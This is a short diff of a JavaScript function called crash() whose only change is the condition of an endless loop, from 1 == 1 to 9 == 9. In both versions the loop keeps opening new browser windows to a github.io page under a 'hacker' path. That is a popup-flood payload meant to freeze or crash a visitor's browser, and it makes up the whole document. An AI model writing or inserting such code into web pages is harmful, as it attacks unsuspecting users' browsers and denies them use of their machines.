@@ -1,5 +1,5 @@
 function crash() {
-  while (1 == 1) {
+  while (9 == 9) {
     window.open("https://admin505admin505.github.io/hacker/", "_blank")
   }
 }
